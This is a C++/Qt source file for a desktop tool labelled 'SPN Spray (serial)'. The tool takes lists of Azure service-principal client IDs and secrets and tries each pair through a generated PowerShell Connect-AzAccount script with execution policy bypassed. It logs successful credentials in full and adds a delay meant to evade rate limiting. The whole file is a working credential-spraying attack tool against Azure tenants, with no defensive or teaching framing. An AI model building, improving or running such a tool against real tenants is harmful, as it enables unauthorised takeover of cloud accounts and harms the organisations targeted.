#include "SPNSpraySerialWindow.h"

#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QLabel>
#include <QLineEdit>
#include <QPushButton>
#include <QTextEdit>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QScrollBar>
#include <QDebug>

#include <QProcess>
#include <QTemporaryFile>
#include <QStandardPaths>
#include <QJsonDocument>
#include <QJsonObject>
#include <QFileInfo>
#include <QThread>
#include <QCoreApplication>
#include <QSpinBox>

// ---------------- Constructor ----------------
SPNSpraySerialWindow::SPNSpraySerialWindow(QWidget *parent)
    : QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("SPN Spray (serial)");
    resize(700, 520);

    auto *main = new QVBoxLayout(this);

    // Tenant
    main->addWidget(new QLabel("Tenant ID (default: common)"));
    tenantEdit = new QLineEdit(this);
    tenantEdit->setPlaceholderText("Tenant ID (GUID or domain)");
    tenantEdit->setText("common");
    main->addWidget(tenantEdit);

    // Client file
    {
        auto *h = new QHBoxLayout();
        clientFileEdit = new QLineEdit(this);
        clientFileEdit->setPlaceholderText("Path to client file (one clientId per line)");
        QPushButton *btn = new QPushButton("Browse", this);
        connect(btn, &QPushButton::clicked, this, [this]() {
            QString p = QFileDialog::getOpenFileName(this, "Select client file");
            if (!p.isEmpty()) clientFileEdit->setText(p);
        });
        h->addWidget(clientFileEdit);
        h->addWidget(btn);
        main->addLayout(h);
    }

    // Password file
    {
        auto *h = new QHBoxLayout();
        passwordFileEdit = new QLineEdit(this);
        passwordFileEdit->setPlaceholderText("Path to password file (one password per line)");
        QPushButton *btn = new QPushButton("Browse", this);
        connect(btn, &QPushButton::clicked, this, [this]() {
            QString p = QFileDialog::getOpenFileName(this, "Select password file");
            if (!p.isEmpty()) passwordFileEdit->setText(p);
        });
        h->addWidget(passwordFileEdit);
        h->addWidget(btn);
        main->addLayout(h);
    }

    // Single client + password
    {
        auto *h = new QHBoxLayout();
        singleClientEdit = new QLineEdit(this);
        singleClientEdit->setPlaceholderText("Single Client ID (optional)");
        singlePasswordEdit = new QLineEdit(this);
        singlePasswordEdit->setPlaceholderText("Single Password/Secret (optional)");
        h->addWidget(singleClientEdit);
        h->addWidget(singlePasswordEdit);
        main->addLayout(h);
    }

    // Delay setting
    {
        auto *h = new QHBoxLayout();
        h->addWidget(new QLabel("Delay between attempts (ms):"));
        delaySpinBox = new QSpinBox(this);
        delaySpinBox->setRange(0, 10000);
        delaySpinBox->setValue(200);
        delaySpinBox->setSingleStep(50);
        delaySpinBox->setToolTip("Delay in milliseconds between spray attempts to avoid rate limiting");
        h->addWidget(delaySpinBox);
        h->addStretch();
        main->addLayout(h);
    }

    // Buttons row
    {
        auto *h = new QHBoxLayout();
        startButton = new QPushButton("Start SPN Spray (serial)", this);
        connect(startButton, &QPushButton::clicked, this, &SPNSpraySerialWindow::startSpray);
        h->addWidget(startButton);

        cancelButton = new QPushButton("Cancel", this);
        cancelButton->setEnabled(false);
        cancelButton->setStyleSheet("QPushButton { background-color: #aa3333; color: white; }");
        connect(cancelButton, &QPushButton::clicked, this, &SPNSpraySerialWindow::cancelSpray);
        h->addWidget(cancelButton);
        main->addLayout(h);
    }

    // Output
    main->addWidget(new QLabel("Output:"));
    output = new QTextEdit(this);
    output->setReadOnly(true);
    main->addWidget(output, 1);
}

// ---------------- Cancel / State ----------------
void SPNSpraySerialWindow::cancelSpray() {
    cancelRequested = true;
    log("[!] Cancel requested - stopping after current attempt...");
}

void SPNSpraySerialWindow::setSprayRunning(bool running) {
    sprayRunning = running;
    startButton->setEnabled(!running);
    cancelButton->setEnabled(running);
    if (!running) cancelRequested = false;
}

// ---------------- Helpers ----------------
void SPNSpraySerialWindow::log(const QString &s) {
    output->append(s);
    if (auto bar = output->verticalScrollBar())
        bar->setValue(bar->maximum());
}

QStringList SPNSpraySerialWindow::readLinesFromFile(const QString &path) {
    QStringList out;
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly | QIODevice::Text)) return out;
    QTextStream in(&f);
    while (!in.atEnd()) {
        QString line = in.readLine().trimmed();
        if (!line.isEmpty()) out.append(line);
    }
    return out;
}

// ---------------- Utility: detect WSL and pick PowerShell exe ----------------
static bool runningUnderWsl()
{
#ifndef Q_OS_WIN
    // On non-Windows check /proc/sys/kernel/osrelease or /proc/version for "Microsoft"
    QFile f("/proc/sys/kernel/osrelease");
    if (f.open(QIODevice::ReadOnly | QIODevice::Text)) {
        QByteArray b = f.readAll().toLower();
        f.close();
        if (b.contains("microsoft")) return true;
    }
    QFile f2("/proc/version");
    if (f2.open(QIODevice::ReadOnly | QIODevice::Text)) {
        QByteArray b = f2.readAll().toLower();
        f2.close();
        if (b.contains("microsoft")) return true;
    }
#endif
    return false;
}

static QString findPowerShellExecutable(QString &debugMsg)
{
    // We'll return the first existing candidate. Fill debugMsg for logging.
    QStringList tried;

#ifdef Q_OS_WIN
    // Native Windows: prefer pwsh then powershell
    QStringList candidates = {
        QStandardPaths::findExecutable("pwsh.exe"),
        "C:/Program Files/PowerShell/7/pwsh.exe",
        QStandardPaths::findExecutable("powershell.exe"),
        "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"
    };
#else
    // Linux/WSL: prefer native pwsh, then fallback to Windows paths via /mnt/c for WSL
    QStringList candidates;
    candidates << QStandardPaths::findExecutable("pwsh");
    candidates << QStandardPaths::findExecutable("pwsh.exe"); // unlikely on Linux but harmless

    // If running under WSL, add common Windows locations mapped under /mnt/c
    if (runningUnderWsl()) {
        candidates << "/mnt/c/Program Files/PowerShell/7/pwsh.exe";
        candidates << "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe";
        candidates << "/mnt/c/Windows/System32/cmd.exe"; // fallback (should exist)
    } else {
        // Non-WSL Linux: maybe user installed pwsh
        candidates << "/usr/bin/pwsh" << "/snap/bin/pwsh";
    }
#endif

    for (const QString &c : candidates) {
        if (c.isEmpty()) {
            tried << "(empty)";
            continue;
        }
        tried << c;
        QFileInfo fi(c);
        if (fi.exists() && fi.isExecutable()) {
            debugMsg = QString("Selected PowerShell executable: %1").arg(c);
            return c;
        }
    }

    // Last-resort: try plain names via PATH
    QStringList names;
#ifndef Q_OS_WIN
    names << "pwsh" << "powershell";
#else
    names << "pwsh.exe" << "powershell.exe";
#endif
    for (const QString &n : names) {
        QString full = QStandardPaths::findExecutable(n);
        tried << n + QString(" (stdpath search)");
        if (!full.isEmpty()) {
            QFileInfo fi(full);
            if (fi.exists() && fi.isExecutable()) {
                debugMsg = QString("Selected PowerShell executable from PATH: %1").arg(full);
                return full;
            }
        }
    }

    debugMsg = QString("No PowerShell executable found. Tried: %1").arg(tried.join(", "));
    return QString();
}

// ---------------- PowerShell login (patched to handle WSL/Linux/Windows) ----------------
bool SPNSpraySerialWindow::trySPNLogin(const QString &clientId,
                                       const QString &clientSecret,
                                       const QString &tenant,
                                       QString &errOut) {
    const QString tenantPart = tenant.isEmpty() ? "common" : tenant;
    const int timeoutMs = 10000;

    auto escapeForPSSingleQuote = [](const QString &in) {
        QString out = in;
        out.replace("'", "''");
        return out;
    };

    const QString clientEsc = escapeForPSSingleQuote(clientId);
    const QString secretEsc = escapeForPSSingleQuote(clientSecret);
    const QString tenantEsc = escapeForPSSingleQuote(tenantPart);

    const QString psScript = QString(R"(
        try {
            $plain = '%1'
            $secure = ConvertTo-SecureString $plain -AsPlainText -Force
            $cred = New-Object System.Management.Automation.PSCredential('%2', $secure)
            Connect-AzAccount -ServicePrincipal -Tenant '%3' -Credential $cred -ErrorAction Stop | Out-Null
            @{ success = $true } | ConvertTo-Json -Compress
        } catch {
            $etype = $_.Exception.GetType().FullName
            $emsg  = $_.Exception.Message
            @{ error = $etype; error_description = $emsg } | ConvertTo-Json -Compress
            exit 1
        }
    )").arg(secretEsc, clientEsc, tenantEsc);

    // Find PowerShell executable with WSL-aware logic
    QString debugChoice;
    QString exe = findPowerShellExecutable(debugChoice);
    qDebug() << debugChoice;
    if (exe.isEmpty()) {
        errOut = QString("No PowerShell executable found. %1").arg(debugChoice);
        return false;
    }

    // --- Handle script file path depending on environment ---
    QString fileArg;       // what we will pass to -File
    QTemporaryFile tmp;    // used in native case
    bool exeIsWindows = exe.contains("/mnt/") || exe.toLower().endsWith(".exe");

    if (exeIsWindows && runningUnderWsl()) {
        // Write script into Windows-visible path
        QString winBase = "/mnt/c/Users/Public";
        if (!QDir(winBase).exists()) {
            if (QDir("/mnt/c/Windows/Temp").exists())
                winBase = "/mnt/c/Windows/Temp";
        }

        QString tmpName = QString("%1/quetzal_ps_%2.ps1")
                              .arg(winBase)
                              .arg(QUuid::createUuid().toString().mid(1, 8));

        QFile winFile(tmpName);
        if (!winFile.open(QIODevice::WriteOnly | QIODevice::Truncate | QIODevice::Text)) {
            errOut = QString("Failed to write script at %1").arg(tmpName);
            return false;
        }
        winFile.write(psScript.toUtf8());
        winFile.close();

        // Convert /mnt/c/... to C:\... for pwsh.exe
        QString winPath = tmpName;
        if (winPath.startsWith("/mnt/") && winPath.size() > 6) {
            QChar drive = winPath[5];
            QString rest = winPath.mid(7); // skip "/mnt/x/"
            rest.replace('/', '\\');
            winPath = QString("%1:\\%2").arg(drive.toUpper()).arg(rest);
        } else {
            winPath.replace('/', '\\');
        }
        fileArg = winPath;
        qDebug() << "Wrote Windows temp script (via WSL):" << tmpName << "->" << fileArg;
    } else {
        // Native Linux or native Windows
        tmp.setFileTemplate(QStandardPaths::writableLocation(QStandardPaths::TempLocation) +
                            "/quetzal_ps_XXXXXX.ps1");
        tmp.setAutoRemove(true);
        if (!tmp.open()) {
            errOut = "Failed to create temp script.";
            return false;
        }
        tmp.write(psScript.toUtf8());
        tmp.flush();
        fileArg = tmp.fileName();
        qDebug() << "Wrote native temp script:" << fileArg;
    }

    // Build args. Use -File for script execution.
    QStringList args{ "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", fileArg };

    qDebug() << "Launching PowerShell:" << exe << args;

    QProcess proc;
    proc.setProcessChannelMode(QProcess::MergedChannels);
    proc.start(exe, args);

    if (!proc.waitForStarted(2000)) {
        errOut = QString("Failed to launch PowerShell (tried '%1').").arg(exe);
        return false;
    }
    if (!proc.waitForFinished(timeoutMs)) {
        proc.kill();
        errOut = "PowerShell timed out.";
        return false;
    }

    QByteArray raw = proc.readAll().trimmed();
    if (raw.isEmpty()) {
        errOut = "Empty PowerShell output.";
        return false;
    }

    QJsonParseError jerr;
    QJsonDocument doc = QJsonDocument::fromJson(raw, &jerr);
    if (jerr.error == QJsonParseError::NoError && doc.isObject()) {
        QJsonObject obj = doc.object();
        if (obj.value("success").toBool()) return true;
        if (obj.contains("error_description"))
            errOut = obj.value("error_description").toString();
        else if (obj.contains("error"))
            errOut = obj.value("error").toString();
        else
            errOut = QString::fromUtf8(raw).left(400);
        return false;
    }

    errOut = QString::fromUtf8(raw).left(400);
    return false;
}


// ---------------- Spray logic ----------------
void SPNSpraySerialWindow::startSpray() {
    output->clear();

    const QString tenant = tenantEdit->text().trimmed();
    const QString clientFile = clientFileEdit->text().trimmed();
    const QString passwordFile = passwordFileEdit->text().trimmed();
    const QString singleClient = singleClientEdit->text().trimmed();
    const QString singlePassword = singlePasswordEdit->text().trimmed();

    if (singleClient.isEmpty() && clientFile.isEmpty()) { log("[!] No client specified."); return; }
    if (singlePassword.isEmpty() && passwordFile.isEmpty()) { log("[!] No password specified."); return; }

    setSprayRunning(true);

    // Mode 1: single client + single password
    if (!singleClient.isEmpty() && !singlePassword.isEmpty()) {
        log(QString("[*] Testing %1 : %2").arg(singleClient, QString(singlePassword).left(6) + "..."));
        QString err; bool ok = trySPNLogin(singleClient, singlePassword, tenant, err);
        if (ok) log(QString("SUCCESS: %1:%2").arg(singleClient, singlePassword));
        else    log(QString("FAIL: %1:%2 -- %3").arg(singleClient, singlePassword, err));
        setSprayRunning(false);
        return;
    }

    // Mode 2: client file + password file
    if (!clientFile.isEmpty() && !passwordFile.isEmpty()) {
        if (!QFile::exists(clientFile) || !QFile::exists(passwordFile)) { log("[!] File missing."); setSprayRunning(false); return; }
        QStringList clients = readLinesFromFile(clientFile);
        QStringList passwords = readLinesFromFile(passwordFile);
        int delayMs = delaySpinBox->value();
        int attempt = 0;
        int total = clients.size() * passwords.size();
        log(QString("[*] Starting spray: %1 clients x %2 passwords = %3 attempts (delay: %4ms)")
            .arg(clients.size()).arg(passwords.size()).arg(total).arg(delayMs));
        for (const QString &c : clients) {
            if (cancelRequested) break;
            for (const QString &p : passwords) {
                if (cancelRequested) break;
                attempt++;
                log(QString("[*] [%1/%2] Testing %3 : %4").arg(attempt).arg(total).arg(c, QString(p).left(6) + "..."));
                QCoreApplication::processEvents();
                QString err; bool ok = trySPNLogin(c, p, tenant, err);
                if (ok) log(QString("SUCCESS: %1:%2").arg(c, p));
                else    log(QString("FAIL: %1:%2 -- %3").arg(c, p, err));
                if (delayMs > 0 && attempt < total) {
                    QThread::msleep(delayMs);
                    QCoreApplication::processEvents();
                }
            }
        }
        if (cancelRequested) log("[!] Spray cancelled by user.");
        setSprayRunning(false);
        return;
    }

    // Mode 3: single client + password file
    if (!singleClient.isEmpty() && !passwordFile.isEmpty()) {
        if (!QFile::exists(passwordFile)) { log("[!] Password file missing."); setSprayRunning(false); return; }
        QStringList passwords = readLinesFromFile(passwordFile);
        int delayMs = delaySpinBox->value();
        int attempt = 0;
        int total = passwords.size();
        log(QString("[*] Starting spray: 1 client x %1 passwords (delay: %2ms)").arg(total).arg(delayMs));
        for (const QString &p : passwords) {
            if (cancelRequested) break;
            attempt++;
            log(QString("[*] [%1/%2] Testing %3 : %4").arg(attempt).arg(total).arg(singleClient, QString(p).left(6) + "..."));
            QCoreApplication::processEvents();
            QString err; bool ok = trySPNLogin(singleClient, p, tenant, err);
            if (ok) log(QString("SUCCESS: %1:%2").arg(singleClient, p));
            else    log(QString("FAIL: %1:%2 -- %3").arg(singleClient, p, err));
            if (delayMs > 0 && attempt < total) {
                QThread::msleep(delayMs);
                QCoreApplication::processEvents();
            }
        }
        if (cancelRequested) log("[!] Spray cancelled by user.");
        setSprayRunning(false);
        return;
    }

    // Mode 4: client file + single password
    if (!clientFile.isEmpty() && !singlePassword.isEmpty()) {
        if (!QFile::exists(clientFile)) { log("[!] Client file missing."); setSprayRunning(false); return; }
        QStringList clients = readLinesFromFile(clientFile);
        int delayMs = delaySpinBox->value();
        int attempt = 0;
        int total = clients.size();
        log(QString("[*] Starting spray: %1 clients x 1 password (delay: %2ms)").arg(total).arg(delayMs));
        for (const QString &c : clients) {
            if (cancelRequested) break;
            attempt++;
            log(QString("[*] [%1/%2] Testing %3 : %4").arg(attempt).arg(total).arg(c, QString(singlePassword).left(6) + "..."));
            QCoreApplication::processEvents();
            QString err; bool ok = trySPNLogin(c, singlePassword, tenant, err);
            if (ok) log(QString("SUCCESS: %1:%2").arg(c, singlePassword));
            else    log(QString("FAIL: %1:%2 -- %3").arg(c, singlePassword, err));
            if (delayMs > 0 && attempt < total) {
                QThread::msleep(delayMs);
                QCoreApplication::processEvents();
            }
        }
        if (cancelRequested) log("[!] Spray cancelled by user.");
        setSprayRunning(false);
        return;
    }

    setSprayRunning(false);
    log("[!] Invalid input combination.");
}
